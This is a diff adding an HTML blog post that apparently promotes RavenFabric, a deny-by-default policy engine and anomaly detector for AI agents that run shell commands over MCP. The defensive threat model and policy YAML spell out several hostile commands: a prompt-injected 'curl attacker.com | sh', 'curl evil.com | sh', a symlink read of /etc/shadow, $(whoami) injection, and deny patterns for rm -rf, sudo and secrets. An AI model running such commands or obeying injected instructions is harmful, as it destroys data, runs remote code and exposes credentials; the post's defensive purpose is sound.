@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="How RavenFabric's deny-by-default policy engine prevents AI agents from executing dangerous commands — security guardrails for autonomous code execution.">
+    <meta name="theme-color" content="#0a0b0d">
+    <meta name="color-scheme" content="dark">
+    <meta name="author" content="Erling Kristiansen">
+    <title>How RavenFabric Stops AI Agents from Running rm -rf / — RavenFabric Blog</title>
+    <link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+    <link rel="alternate" type="application/rss+xml" title="RavenFabric Blog" href="/feed.xml">
+    <meta property="og:title" content="How RavenFabric Stops AI Agents from Running rm -rf /">
+    <meta property="og:description" content="Deny-by-default policy enforcement for autonomous AI execution — because 'are you sure?' doesn't work for machines.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://ravenfabric.io/blog/ai-guardrails.html">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; connect-src 'none'; script-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'none'">
+    <style>
+        @font-face {
+            font-family: 'IBM Plex Sans';
+            font-style: normal;
+            font-weight: 400 700;
+            font-display: swap;
+            src: url(/assets/fonts/ibm-plex-sans-latin.woff2) format('woff2');
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'IBM Plex Sans', system-ui, sans-serif;
+            background: #0a0b0d;
+            color: #e8e6e3;
+            line-height: 1.8;
+        }
+        a { color: #c9a961; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .container { max-width: 720px; margin: 0 auto; padding: 0 1.5rem; }
+        header {
+            border-bottom: 1px solid #1f2228;
+            padding: 1rem 0;
+        }
+        header .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        header .brand { font-size: 1.25rem; font-weight: 700; }
+        header nav a { margin-left: 1.5rem; color: #a8a39a; }
+        header nav a:hover { color: #e8e6e3; }
+        main { padding: 3rem 0; }
+        article h1 { font-size: 2rem; margin-bottom: 0.5rem; }
+        .post-meta { color: #8a8579; margin-bottom: 2rem; font-size: 0.875rem; }
+        article h2 { font-size: 1.5rem; margin: 2rem 0 1rem; color: #c9a961; }
+        article p { margin-bottom: 1.25rem; color: #a8a39a; }
+        article strong { color: #e8e6e3; }
+        article code {
+            background: #15171b;
+            padding: 0.15em 0.4em;
+            border-radius: 3px;
+            font-size: 0.9em;
+            color: #c9a961;
+        }
+        article pre {
+            background: #15171b;
+            padding: 1.25rem;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin-bottom: 1.25rem;
+            border: 1px solid #1f2228;
+        }
+        article pre code {
+            background: none;
+            padding: 0;
+            color: #e8e6e3;
+        }
+        article ul, article ol {
+            margin-bottom: 1.25rem;
+            padding-left: 1.5rem;
+            color: #a8a39a;
+        }
+        article li { margin-bottom: 0.5rem; }
+        .back-link { margin-top: 3rem; padding-top: 2rem; border-top: 1px solid #1f2228; }
+        footer {
+            border-top: 1px solid #1f2228;
+            padding: 2rem 0;
+            text-align: center;
+            color: #8a8579;
+            font-size: 0.875rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <a href="/" class="brand">RavenFabric</a>
+            <nav>
+                <a href="/">Home</a>
+                <a href="/docs/">Docs</a>
+                <a href="/blog/">Blog</a>
+                <a href="https://github.com/egkristi/RavenFabric">GitHub</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <article>
+                <h1>How RavenFabric Stops AI Agents from Running rm -rf /</h1>
+                <div class="post-meta">May 6, 2026 &middot; 7 min read</div>
+
+                <p>AI coding agents are incredible. Claude, GPT, Cursor, Aider — they write code, run tests, deploy applications. But they also run shell commands. On your production servers. With whatever permissions they happen to have.</p>
+
+                <p><strong>What happens when an AI agent hallucinates a destructive command?</strong></p>
+
+                <p>The industry's answer so far has been "ask the user to confirm." A modal dialog. A y/n prompt. But that assumes a human is watching. In autonomous workflows — CI/CD pipelines, overnight batch jobs, MCP-connected AI assistants — nobody is watching.</p>
+
+                <p>RavenFabric takes a different approach: <strong>deny by default, allow by policy, enforce at the agent.</strong></p>
+
+                <h2>The Threat Model</h2>
+
+                <p>Consider an AI agent connected to your infrastructure via MCP (Model Context Protocol). It has access to an <code>exec</code> tool that runs shell commands remotely. The agent is helpful — it deploys your code, checks logs, restarts services. Until it doesn't.</p>
+
+                <p>Failure modes aren't hypothetical:</p>
+
+                <ul>
+                    <li><strong>Hallucinated commands</strong> — the model generates <code>rm -rf /tmp</code> when it meant <code>rm -rf /tmp/build-cache</code>, but the path was wrong</li>
+                    <li><strong>Prompt injection</strong> — a user's code comment contains instructions that manipulate the AI into running <code>curl attacker.com | sh</code></li>
+                    <li><strong>Over-eager cleanup</strong> — the agent decides to "clean up" by removing files it doesn't recognize</li>
+                    <li><strong>Privilege escalation</strong> — the agent discovers it can <code>sudo</code> and starts "fixing" things</li>
+                </ul>
+
+                <p>Traditional access control (Unix permissions, sudo rules) wasn't designed for this. It answers "can this user do this?" but not "should this action happen given the current context, intent, and blast radius?"</p>
+
+                <h2>RavenFabric's Policy Engine</h2>
+
+                <p>Every command that executes through RavenFabric passes through a <strong>deny-by-default policy engine</strong>. Nothing runs unless explicitly allowed:</p>
+
+<pre><code>apiVersion: ravenfabric.io/v1alpha1
+kind: RPCPolicy
+metadata:
+  name: ai-agent-restricted
+spec:
+  commands:
+    allow:
+      - pattern: "^git -C /workspace .*"
+      - pattern: "^npm (ci|test|run build|run lint)$"
+      - pattern: "^systemctl (status|restart) myapp$"
+    deny:
+      - pattern: ".*rm.*-rf.*"
+      - pattern: "^sudo .*"
+      - pattern: ".*curl.*\\|.*sh.*"
+      - pattern: ".*secret.*"
+  filesystem:
+    allow:
+      - path: /workspace
+        operations: [read, write, list]
+    deny:
+      - path: /etc
+      - path: /root
+      - path: /var/log
+  resources:
+    maxOutputBytes: 10485760
+    taskTimeoutSeconds: 300</code></pre>
+
+                <p>This policy allows the AI to work within <code>/workspace</code>, run git, npm, and restart a specific service. Everything else is denied. Not by convention — by enforcement.</p>
+
+                <h2>Two Checks, Not One</h2>
+
+                <p>RavenFabric doesn't rely on a single policy check. The architecture enforces <strong>two independent checks</strong>:</p>
+
+                <ol>
+                    <li><strong>Controller pre-flight</strong> — before the command is even sent to the target agent, the orchestrator validates it against policy. This catches obvious violations early and provides fast feedback.</li>
+                    <li><strong>Agent-local enforcement</strong> — the agent on the target machine re-checks the command against its own policy copy. Even if the orchestrator is compromised, the agent refuses unauthorized commands.</li>
+                </ol>
+
+                <p>The agent is always the final authority. A compromised controller, a manipulated client, or a prompt-injected AI cannot override the agent's local policy.</p>
+
+                <h2>Pattern Matching: Regex with Deny-Wins</h2>
+
+                <p>Policy rules use regex patterns. The evaluation is straightforward:</p>
+
+                <ol>
+                    <li>Check deny list first — if any deny pattern matches, reject immediately</li>
+                    <li>Check allow list — if any allow pattern matches, permit</li>
+                    <li>Default deny — if nothing matches, reject</li>
+                </ol>
+
+                <p>Deny always wins. You can't accidentally allow <code>rm -rf</code> by adding an overly broad allow rule if there's a deny pattern catching it. This is the same principle as firewall rules: explicit deny overrides everything.</p>
+
+                <h2>Shell Injection Prevention</h2>
+
+                <p>AI agents are particularly susceptible to shell injection because they construct commands from natural language. Consider:</p>
+
+<pre><code># User asks: "check the status of the service named $(whoami)"
+# AI generates: systemctl status $(whoami)
+# Shell expands: systemctl status root</code></pre>
+
+                <p>RavenFabric's policy engine inspects the <strong>literal command string before shell expansion</strong>. It also detects common injection patterns:</p>
+
+                <ul>
+                    <li>Backtick substitution: <code>`command`</code></li>
+                    <li>Dollar substitution: <code>$(command)</code></li>
+                    <li>Pipe chains: <code>safe-cmd | malicious-cmd</code></li>
+                    <li>Semicolons: <code>safe-cmd; malicious-cmd</code></li>
+                    <li>Backgrounding: <code>malicious-cmd &amp;</code></li>
+                </ul>
+
+                <p>If the policy doesn't explicitly allow pipe characters in a command pattern, they're rejected. The AI can't construct an injection that the policy engine hasn't anticipated.</p>
+
+                <h2>Resource Limits: Containing Blast Radius</h2>
+
+                <p>Even allowed commands are constrained:</p>
+
+                <ul>
+                    <li><strong>Output size limit</strong> — prevents an AI from running <code>cat /dev/urandom</code> or dumping a 10GB log file into its context window</li>
+                    <li><strong>Execution timeout</strong> — no command runs forever. A hung process is killed after the configured timeout</li>
+                    <li><strong>Filesystem boundaries</strong> — symlink resolution before path checks prevents <code>ln -s /etc/shadow /workspace/shadow &amp;&amp; cat /workspace/shadow</code></li>
+                </ul>
+
+                <h2>Audit: Everything is Logged</h2>
+
+                <p>Every command — allowed or denied — produces a structured audit entry:</p>
+
+<pre><code>{"timestamp":"2026-05-06T14:23:01Z","action":"exec",
+ "command":"rm -rf /tmp/cache","result":"denied",
+ "reason":"matches deny pattern: .*rm.*-rf.*",
+ "caller":"ai-agent-mcp-session-7f3a","agent":"prod-web-01"}</code></pre>
+
+                <p>This creates an immutable trail. When an AI agent misbehaves, you can reconstruct exactly what it attempted, when, and why it was stopped. The audit log is append-only — even a compromised agent cannot delete evidence.</p>
+
+                <h2>MCP Integration</h2>
+
+                <p>RavenFabric's MCP server (<code>rf-mcp-server</code>) integrates directly with AI assistants. The AI sees tools like <code>rf_exec</code>, <code>rf_file_read</code>, <code>rf_file_write</code>. Behind the scenes, every call goes through the full policy stack:</p>
+
+<pre><code># AI calls rf_exec("rm -rf /tmp")
+# → Policy check: DENIED (matches deny pattern)
+# → AI receives: {"error": "command denied by policy"}
+# → AI adapts: tries a different, allowed approach</code></pre>
+
+                <p>The AI learns from denials. It adapts. It doesn't crash or lose context — it receives a clear error and adjusts its strategy. This is how guardrails should work: not by removing capability, but by bounding it.</p>
+
+                <h2>Behavioral Anomaly Detection</h2>
+
+                <p>Static policy catches known-bad patterns. But what about novel attacks? RavenFabric includes behavioral anomaly detection that scores actions across four dimensions:</p>
+
+                <ul>
+                    <li><strong>Velocity</strong> — sudden spike in command frequency (possible automated attack)</li>
+                    <li><strong>Novelty</strong> — commands never seen from this caller before</li>
+                    <li><strong>Timing</strong> — actions outside normal operating hours</li>
+                    <li><strong>Escalation</strong> — progressive broadening of access (reconnaissance pattern)</li>
+                </ul>
+
+                <p>When the combined anomaly score exceeds a threshold, capabilities are automatically reduced until a human operator reviews the situation.</p>
+
+                <h2>The Result</h2>
+
+                <p>An AI agent connected to RavenFabric can be productive — running builds, deploying code, checking logs — without being dangerous. The policy engine is the boundary between "helpful" and "harmful." It's not a suggestion or a convention. It's enforcement.</p>
+
+                <p>No <code>rm -rf /</code>. No <code>sudo bash</code>. No <code>curl evil.com | sh</code>. Not because the AI chose not to — because the system won't let it. Policy is physics, not etiquette.</p>
+
+                <div class="back-link">
+                    <a href="/blog/">&larr; Back to all posts</a>
+                </div>
+            </article>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 RavenFabric. AGPLv3 + Commercial dual license.</p>
+        </div>
+    </footer>
+</body>
+</html>
